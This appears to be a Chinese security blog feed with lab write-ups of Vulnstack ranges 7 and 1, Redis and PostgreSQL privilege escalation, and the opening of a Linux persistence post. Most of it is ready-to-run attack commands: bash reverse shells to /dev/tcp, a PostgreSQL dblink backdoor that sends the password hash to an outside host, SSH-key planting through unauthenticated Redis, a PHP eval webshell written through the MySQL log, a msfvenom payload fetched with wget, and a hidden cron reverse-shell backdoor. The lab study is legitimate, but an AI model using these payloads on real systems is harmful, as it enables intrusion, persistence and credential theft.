class="line">save</span><br></pre></td></tr></table></figure><p>参考：<a href="https://blog.csdn.net/fly_hps/article/details/80937837">https://blog.csdn.net/fly_hps/article/details/80937837</a></p><h3 id="2、ssh-keygen公钥利用"><a href="#2、ssh-keygen公钥利用" class="headerlink" title="2、ssh-keygen公钥利用"></a>2、ssh-keygen公钥利用</h3><p>写ssh-keygen公钥然后使用私钥登陆</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br><span class="line">cd /root/.ssh/</span><br><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt</span><br><span class="line">cat key.txt | redis-cli -h 192.168.52.136 -p 6379 -x set shell</span><br><span class="line">redis-cli -h 192.168.52.136</span><br><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p><img src="/posts/29c025a9/image-20230302222237036.png" alt="image-20230302222237036"></p><h2 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h2><p>PostgreSQL是一款关系型数据库。其9.3到11版本中存在一处“特性”，管理员或具有“COPY TO&#x2F;FROM PROGRAM”权限的用户，可以使用这个特性执行任意命令。<br>提权利用的是漏洞：CVE-2018-1058 CVE-2019-9193<br>参考：<a href="https://vulhub.org/#/environments/postgres/">https://vulhub.org/#/environments/postgres/</a></p><h3 id="1、CVE-2018-1058"><a href="#1、CVE-2018-1058" class="headerlink" title="1、CVE-2018-1058"></a>1、CVE-2018-1058</h3><p>采用vulhub复现：<a href="https://vulhub.org/#/environments/postgres/CVE-2018-1058/">https://vulhub.org/#/environments/postgres/CVE-2018-1058/</a><br>1、普通用户植入后门命令<br>先利用Navicat连接数据库然后执行下面命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE FUNCTION public.array_to_string(anyarray,text) RETURNS TEXT AS $$</span><br><span class="line">    select dblink_connect((select &#x27;hostaddr=接受shell的ip地址 port=5433 user=postgres password=chybeta sslmode=disable dbname=&#x27;||(SELECT passwd FROM pg_shadow WHERE usename=&#x27;postgres&#x27;))); </span><br><span class="line">    SELECT pg_catalog.array_to_string($1,$2);</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">$ LANGUAGE SQL VOLATILE;</span></span><br></pre></td></tr></table></figure><p>接受shell主句监听5433端口<br>2、管理员操作数据库触发后门</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose exec postgres pg_dump -U postgres -f evil.bak vulhub</span><br></pre></td></tr></table></figure><p>模拟管理员触发后门，监听主机可收到shell</p><h3 id="2、CVE-2019-9193"><a href="#2、CVE-2019-9193" class="headerlink" title="2、CVE-2019-9193"></a>2、CVE-2019-9193</h3><p>采用vulhub复现：<a href="https://vulhub.org/#/environments/postgres/CVE-2019-9193/">https://vulhub.org/#/environments/postgres/CVE-2019-9193/</a><br>该漏洞利用的是管理员用户，不是普通用户<br>利用Navicat使用管理员用户连接数据库执行以下命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DROP TABLE IF EXISTS cmd_exec;</span><br><span class="line">CREATE TABLE cmd_exec(cmd_output text);</span><br><span class="line">COPY cmd_exec FROM PROGRAM &#x27;id&#x27;;</span><br><span class="line">SELECT * FROM cmd_exec;</span><br></pre></td></tr></table></figure><p><img src="/posts/29c025a9/1677759866674-bf55fb8f-397b-4258-9c9f-8cff99599012.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 提权 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnstack红日靶场7</title>
      <link href="/posts/a56ee1fe/"/>
      <url>/posts/a56ee1fe/</url>
      
        <content type="html"><![CDATA[<h1 id="Vulnstack红日靶场7"><a href="#Vulnstack红日靶场7" class="headerlink" title="Vulnstack红日靶场7"></a>Vulnstack红日靶场7</h1><h2 id="环境拓扑"><a href="#环境拓扑" class="headerlink" title="环境拓扑"></a>环境拓扑</h2><p>靶场地址:<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/9/">http://vulnstack.qiyuanxuetang.net/vuln/detail/9/</a></p><p><img src="/posts/a56ee1fe/1614336174_6038d0ae97a56a0f1e287.png" alt="img"></p><h3 id="服务配置"><a href="#服务配置" class="headerlink" title="服务配置"></a>服务配置</h3><p>DMZ区的 Ubuntu 需要启动redis和nginx服务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">root启动</span></span><br><span class="line">redis-server /etc/redis.conf</span><br><span class="line">/usr/sbin/nginx -c /etc/nginx/nginx.conf</span><br><span class="line">iptables -F</span><br></pre></td></tr></table></figure><p>第二层网络的 Ubuntu需要启动docker容器：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">root启动</span></span><br><span class="line">service docker start</span><br><span class="line">docker start 8e172820ac78</span><br></pre></td></tr></table></figure><p>第二层网络的 Windows 7 （PC 1）需要启动通达OA</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">administrator启动，关闭防火墙</span></span><br><span class="line">C:\MYOA\bin\AutoConfig.exe</span><br></pre></td></tr></table></figure><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>直接访问192.168.118.138<br><img src="/posts/a56ee1fe/image-20221107095051360.png" alt="image-20221107095051360"><br>是个404,扫端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.118.138 -p 1-65535</span><br></pre></td></tr></table></figure><p><img src="/posts/a56ee1fe/image-20221107095200252.png" alt="image-20221107095200252"></p><p>有个81和6379的redis<br>81是一个Laravel<br><img src="/posts/a56ee1fe/image-20221107095240654.png" alt="image-20221107095240654"><br>版本是v8.29.0可以用CVE-2021-3129 RCE打<br><a href="https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP">https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP</a><br><img src="/posts/a56ee1fe/image-20221107100549500.png" alt="image-20221107100549500"><br>用哥斯拉连接<br><strong>注意：</strong>要用2.9.6之前的哥斯拉 <a href="https://github.com/BeichenDream/Godzilla/releases">https://github.com/BeichenDream/Godzilla/releases</a><br><img src="/posts/a56ee1fe/image-20221107100940567.png" alt="image-20221107100940567"><br>连接上shell先判断是否在docker里</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -alh /.dockerenv</span><br><span class="line">cat /proc/1/cgroup</span><br></pre></td></tr></table></figure><p><img src="/posts/a56ee1fe/image-20221107101359457.png" alt="image-20221107101359457"><br>确实是docker<br>先把shell弹到kali上操作</p><p><img src="/posts/a56ee1fe/image-20221107105743486.png" alt="image-20221107105743486"><br>没有任何反应……<br>这条思路断了去看看6379的redis<br><img src="/posts/a56ee1fe/image-20221107105952642.png" alt="image-20221107105952642"><br>未授权直接连上<br>尝试能不能写ssh-key</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br><span class="line">cd /root/.ssh/</span><br><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt</span><br><span class="line">cat key.txt | redis-cli -h 192.168.118.138 -p 6379 -x set shell</span><br><span class="line">redis-cli -h 192.168.118.138</span><br></pre></td></tr></table></figure><p><img src="/posts/a56ee1fe/image-20221107110734745.png" alt="image-20221107110734745"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p><img src="/posts/a56ee1fe/image-20221107110855551.png" alt="image-20221107110855551"><br>ssh尝试连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa root@192.168.118.138</span><br></pre></td></tr></table></figure><p><img src="/posts/a56ee1fe/image-20221107111013358.png" alt="image-20221107111013358"><br>root权限成功连接<br>接下来看下nginx的配置为什么刚才的反弹shell没有成功<br><img src="/posts/a56ee1fe/image-20221107111505609.png" alt="image-20221107111505609"><br>破案了，81端口是52.20主机做的反向代理<br>既然这样那就将shell反弹到52.10主机然后再操作</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.52.10/1234 0&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure><p><img src="/posts/a56ee1fe/image-20221107112745207.png" alt="image-20221107112745207"><br>低权限,先提权，先试下suid</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/posts/a56ee1fe/image-20221107112939255.png" alt="image-20221107112939255"><br>有一个shell很奇怪,切换目录执行一下<br><img src="/posts/a56ee1fe/image-20221107113318314.png" alt="image-20221107113318314"><br>执行了一个ps命令<br>目录下面还有个demo.c，应该是shell的原代码<br><img src="/posts/a56ee1fe/image-20221107122847940.png" alt="image-20221107122847940"><br>可以看到ps是直接调用环境变量$PATH中的ps那么就可以在$PATH中做文章了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo &quot;/bin/bash&quot; &gt; ps</span><br><span class="line">chmod 777 ps</span><br><span class="line">echo $PATH </span><br><span class="line">export PATH=/tmp:$PATH # 将/tmp添加到环境变量中，并且先加载执行/tmp里的程序</span><br></pre></td></tr></table></figure><p>在&#x2F;tmp目录下创建一个ps内容为<code>/bin/bash</code>并给个执行权限，同时把tmp写进环境变量，那么在执行ps时就会优先调用&#x2F;tmp下的ps</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /home/jobs</span><br><span class="line">./shell</span><br></pre></td></tr></table></figure><p><img src="/posts/a56ee1fe/image-20221107123602347.png" alt="image-20221107123602347"><br>提权成功<br>再次反弹shell到52.10</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#x27;exec bash -i &amp;&gt;/dev/tcp/192.168.52.10/7890 &lt;&amp;1&#x27;</span><br></pre></td></tr></table></figure><p><img src="/posts/a56ee1fe/image-20221107150648627.png" alt="image-20221107150648627"><br>接下来要想办法进行docker逃逸了<br>利用特权模式进行docker逃逸</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l #查看磁盘文件</span><br></pre></td></tr></table></figure><p><img src="/posts/a56ee1fe/image-20221107152746001.png" alt="image-20221107152746001"><br>创建一个文件夹来挂载磁盘</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir shell</span><br><span class="line">mount /dev/sda1 /shell</span><br><span class="line">ls /shell</span><br></pre></td></tr></table></figure><p><img src="/posts/a56ee1fe/image-20221107155628816.png" alt="image-20221107155628816"><br>看看能不能继续利用ssh_key<br>先看一下home下有那些用户<br><img src="/posts/a56ee1fe/image-20221107163003684.png" alt="image-20221107163003684"><br>就在看ubuntu下面的文件时突然发现了惊喜<br><img src="/posts/a56ee1fe/image-20221107163038489.png" alt="image-20221107163038489"><br>查看文件直接读取到了ubuntu的密码</p><p><img src="/posts/a56ee1fe/image-20221107163109221.png" alt="image-20221107163109221"><br>这下直接用52.10的ssh连接就好了<br><img src="/posts/a56ee1fe/image-20221107163345812.png" alt="image-20221107163345812"><br>这里只是一个普通用户权限还要提一下权限<br>利用<a href="https://github.com/briskets/CVE-2021-3493">CVE-2021-3493</a><br>本地创建一个exp.c然后把代码复制进来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">vim exploit.c</span><br><span class="line">gcc exploit.c -o exploit</span><br><span class="line">chmod +x exploit</span><br><span class="line">./exploit</span><br></pre></td></tr></table></figure><p><img src="/posts/a56ee1fe/image-20221107171825431.png" alt="image-20221107171825431"><br>提权成功<br>现在已经拿下两个主机了先把他们上线msf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.31.136 LPORT=4445 -f elf &gt; /root/ubuntu.elf</span><br></pre></td></tr></table></figure><p>生成完成后kali开启web服务<br>52.10下载木马</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.31.136/ubuntu.elf</span><br></pre></td></tr></table></figure><p>开启监听</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 4445</span><br></pre></td></tr></table></figure><p><img src="/posts/a56ee1fe/image-20221107194301510.png" alt="image-20221107194301510"><br>52.10成功上线<br>添加路由</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/multi/manage/autoroute</span><br></pre></td></tr></table></figure><p><img src="/posts/a56ee1fe/image-20221107194450241.png" alt="image-20221107194450241"><br>52.20也是出网直接利用<br><img src="/posts/a56ee1fe/image-20221108205845363.png" alt="image-20221108205845363"><br><img src="/posts/a56ee1fe/image-20221108210643248.png" alt="image-20221108210643248"><br>这里52.20不是root权限是因为前面提到root手贱关机了 然后再重新尝试时exp疯狂报错……<br>不影响后续渗透<br>52.20添加路由</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/multi/manage/autoroute</span><br></pre></td></tr></table></figure><p><img src="/posts/a56ee1fe/image-20221108211210182.png" alt="image-20221108211210182"><br>发现多了一个93网段<br>先扫一下52网段还有没有主机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/discovery/udp_probe</span><br><span class="line">set rhosts 192.168.52.1-255</span><br><span class="line">set threads 5</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/posts/a56ee1fe/image-20221108211838117.png" alt="image-20221108211838117"><br>扫到一台30<br>web1开一个socks代理看下是什么</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set srvhost 192.168.31.187</span><br></pre></td></tr></table></figure><p><img src="/posts/a56ee1fe/image-20221108213636816.png" alt="image-20221108213636816"><br>是一个oa系统<br>proxifier建立代理oa利用工具<br><img src="/posts/a56ee1fe/image-20221108215720078.png" alt="image-20221108215720078"><br><img src="/posts/a56ee1fe/image-20221108215846960.png" alt="image-20221108215846960"><br>52网段是出网的可以直接上线cs</p><p><img src="/posts/a56ee1fe/image-20221108220509708.png" alt="image-20221108220509708"><br><img src="/posts/a56ee1fe/image-20221108220547063.png" alt="image-20221108220547063"></p><p>扫描93网段<br><img src="/posts/a56ee1fe/image-20221108220703180.png" alt="image-20221108220703180"></p><p><img src="/posts/a56ee1fe/image-20221108221204395.png" alt="image-20221108221204395"><br>抓取密码<br><img src="/posts/a56ee1fe/image-20221108221525818.png" alt="image-20221108221525818"><br>既然抓到密码了可以利用smb横向</p><p><img src="/posts/a56ee1fe/image-20221108223016151.png" alt="image-20221108223016151"></p><p>还可以利用ipc通道把马子传到域控</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.93.30\ipc$ &quot;Whoami2021&quot; /user:&quot;administrator&quot;</span><br><span class="line">copy C:\MYOA\webroot\beacon.exe \\192.168.93.30\c$</span><br></pre></td></tr></table></figure><p>然后利用改成smb得到的shell执行文件，或者利用ipc添加定时任务<br>DC不出网要利用转发上线,PC1建立转发上线监听然后生成马子利用上面的方法传到域控然后上线</p><p><img src="/posts/a56ee1fe/image-20221108224648343.png" alt="image-20221108224648343"><br>对于PC2也是一样的步骤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.93.40\ipc$ &quot;Whoami2021&quot; /user:&quot;administrator&quot;</span><br></pre></td></tr></table></figure><p><img src="/posts/a56ee1fe/image-20221108225012991.png" alt="image-20221108225012991"><img src="/posts/a56ee1fe/image-20221108225323892.png" alt="image-20221108225323892"></p><p>全部拿下</p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnstack红日靶场1</title>
      <link href="/posts/4c0d44cb/"/>
      <url>/posts/4c0d44cb/</url>
      
        <content type="html"><![CDATA[<h1 id="Vulnstack红日靶场1"><a href="#Vulnstack红日靶场1" class="headerlink" title="Vulnstack红日靶场1"></a>Vulnstack红日靶场1</h1><h2 id="环境拓扑"><a href="#环境拓扑" class="headerlink" title="环境拓扑"></a>环境拓扑</h2><p><img src="/posts/4c0d44cb/ce7ddd3f-7c6b-4763-81dc-928d373c4210-11763069.jpg" alt="img"></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>访问web是一个phpstudy探针</p><p><img src="/posts/4c0d44cb/image-20221105090147000.png" alt="image-20221105090147000"></p><p>可以找到web绝对路径<br>想到phpmyadmin访问:url&#x2F;phpmyadmin<br><img src="/posts/4c0d44cb/image-20221105090411063.png" alt="image-20221105090411063"><br>尝试弱口令root&#x2F;root<br>成功进入接下来就是利用phpadminGetshell了<br>先尝试select into outfile能不能写一句话</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">GLOBAL</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;%secure%</span></span><br></pre></td></tr></table></figure><p><img src="/posts/4c0d44cb/image-20221105091346248.png" alt="image-20221105091346248"><br>看来一句话不能利用<br>尝试利用日志写shell</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;%general%&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/posts/4c0d44cb/image-20221105091527951.png" alt="image-20221105091527951"><br>得到日志文件位置<br>大概思路:开启general_log选项，把日志路径修改为网站根目录下的一个php文件下，然后把一句话写入日志达到getshell<br>开启general_log </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log = on;</span><br></pre></td></tr></table></figure><p>修改日志路径(这里就利用到了前面获取的网站绝对路径)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file<span class="operator">=</span><span class="string">&#x27;C:/phpStudy/WWW/shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="/posts/4c0d44cb/image-20221105092137875.png" alt="image-20221105092137875"><br>成功修改<br>写入一句话</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;</span></span><br></pre></td></tr></table></figure><p>连接shell<img src="/posts/4c0d44cb/image-20221105092353234.png" alt="image-20221105092353234"><br>发现还有一套cms<br><img src="/posts/4c0d44cb/image-20221105111916333.png" alt="image-20221105111916333"><br><img src="/posts/4c0d44cb/image-20221105111939679.png" alt="image-20221105111939679"><br>公告处直接给了后台入口和密码<br>后台存在SQL执行<br><img src="/posts/4c0d44cb/image-20221105122706041.png" alt="image-20221105122706041"><br>一样可以利用日志或者直接写一句话<br>经过测试利用日志写一句话可以成功<br><img src="/posts/4c0d44cb/image-20221105123434215.png" alt="image-20221105123434215"><br>发现模板文件可以编辑<br><img src="/posts/4c0d44cb/image-20221105123648290.png" alt="image-20221105123648290"><br>选择新增文件<br><img src="/posts/4c0d44cb/image-20221105123728834.png" alt="image-20221105123728834"><br>直接写入shell<br>回到刚才拿到的shell</p><p><img src="/posts/4c0d44cb/image-20221105093235399.png" alt="image-20221105093235399"><br>权限为administrator<br>接下来传cs马,上线cs<br><img src="/posts/4c0d44cb/image-20221105094059576.png" alt="image-20221105094059576"><br><img src="/posts/4c0d44cb/image-20221105094112966.png" alt="image-20221105094112966"><img src="/posts/4c0d44cb/image-20221105093724875.png" alt="image-20221105093724875"><br>利用插件里的ms14-058提到system权限<br><img src="/posts/4c0d44cb/image-20221105094003106.png" alt="image-20221105094003106"><br><img src="/posts/4c0d44cb/image-20221105094010621.png" alt="image-20221105094010621"><br>接下来就是信息搜集了<br><img src="/posts/4c0d44cb/image-20221105094407408.png" alt="image-20221105094407408"><br>扫内网段<br><img src="/posts/4c0d44cb/image-20221105094427323.png" alt="image-20221105094427323"></p><p><img src="/posts/4c0d44cb/image-20221105100024715.png" alt="image-20221105100024715"><br>继续抓Hash和密码<br><img src="/posts/4c0d44cb/image-20221105100535786.png" alt="image-20221105100535786"></p><h2 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h2><h3 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h3><p>发现内网两台主机开启了445端口<br><img src="/posts/4c0d44cb/image-20221105102108390.png" alt="image-20221105102108390"><br><img src="/posts/4c0d44cb/image-20221105102119948.png" alt="image-20221105102119948"></p><p>可以利用smb协议创建监听器然后利用psexec横向<br><img src="/posts/4c0d44cb/image-20221105110702067.png" alt="image-20221105110702067"><br><img src="/posts/4c0d44cb/image-20221105110717359.png" alt="image-20221105110717359"><br>利用刚在抓取到的明文密码<br><img src="/posts/4c0d44cb/image-20221105110822079.png" alt="image-20221105110822079"><br><img src="/posts/4c0d44cb/image-20221105111047041.png" alt="image-20221105111047041">域控和域成员都成功上线</p><h3 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h3><p>除了利用smb协议横向外还可以利用445端口的ms17010<br>由于cs没有ms17-010的利用插件要联动msf将会话传到msf<br>CS建立监听器<br><img src="/posts/4c0d44cb/image-20221105102650000.png" alt="image-20221105102650000"><br>MSF监听联动配置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 8888</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>CS执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spawn MSF #MSF为监听器名称,区分大小写</span><br></pre></td></tr></table></figure><p><img src="/posts/4c0d44cb/image-20221105103054944.png" alt="image-20221105103054944"><br>添加路由</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -p #查看当前路由表</span><br><span class="line">run post/multi/manage/autoroute #添加当前路由表</span><br></pre></td></tr></table></figure><p><img src="/posts/4c0d44cb/image-20221105103318047.png" alt="image-20221105103318047"><br>接下来该利用ms17-010了,先用<code>backgroud</code>将会话置于会话<br>ms17010检测模块</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line">set rhosts 192.168.52.137-144 #设置扫描目标段</span><br><span class="line">set threads 5 #设置扫描线程数</span><br><span class="line">run </span><br></pre></td></tr></table></figure><p><img src="/posts/4c0d44cb/image-20221105103643340.png" alt="image-20221105103643340"><br>利用模块</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp #主机不出网使用正向连接上线</span><br><span class="line">set rhost 192.168.52.138 #设置连接目标</span><br><span class="line">set rhosts 192.168.52.138 #设置扫描目标</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>这里exp死活打不出来，换了exp也是执行成功但没有会话返回……放弃了</p><p>参考:<br><a href="https://blog.csdn.net/qq_52469895/article/details/124084745">https://blog.csdn.net/qq_52469895/article/details/124084745</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux权限维持(二)-Cron定时任务&amp;Strace监控&amp;Alias别名&amp;Rootkit后门</title>
      <link href="/posts/1e8c3e31/"/>
      <url>/posts/1e8c3e31/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux权限维持-二-Cron定时任务-amp-Strace监控-amp-Alias别名-amp-Rootkit后门"><a href="#Linux权限维持-二-Cron定时任务-amp-Strace监控-amp-Alias别名-amp-Rootkit后门" class="headerlink" title="Linux权限维持(二)-Cron定时任务&amp;Strace监控&amp;Alias别名&amp;Rootkit后门"></a>Linux权限维持(二)-Cron定时任务&amp;Strace监控&amp;Alias别名&amp;Rootkit后门</h1><h2 id="定时任务-Cron后门"><a href="#定时任务-Cron后门" class="headerlink" title="定时任务-Cron后门"></a>定时任务-Cron后门</h2><p>利用系统的定时任务功能进行反弹Shell</p><h3 id="1、编辑后门反弹"><a href="#1、编辑后门反弹" class="headerlink" title="1、编辑后门反弹"></a>1、编辑后门反弹</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/.test.sh</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.31.136/3333 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="/posts/1e8c3e31/1668041111388-dbd770f3-dfca-4a06-b5c0-32209e718cc7.png" alt="image.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /etc/.test.sh</span><br></pre></td></tr></table></figure><h3 id="2、添加定时任务"><a href="#2、添加定时任务" class="headerlink" title="2、添加定时任务"></a>2、添加定时任务</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/crontab</span><br><span class="line">*/1 * * * * root /etc/.test.sh #以root权限每分钟执行该文件</span><br></pre></td></tr></table></figure><p><img src="/posts/1e8c3e31/1668041371088-935db5fc-8097-4104-978d-107d6776645f.png" alt="image.png"><br>即使退出该shell隔1分钟依然可以接受到shell</p><h2 id="监控功能-Strace后门"><a href="#监控功能-Strace后门" class="headerlink" title="监控功能-Strace后门"></a>监控功能-Strace后门</h2><p>strace是一个动态跟踪工具，它可以跟踪系统调用的执行。我们可以把他当成一个键盘记录的后门，来扩大我们的信息收集范围</p><h3 id="1、记录sshd明文"><a 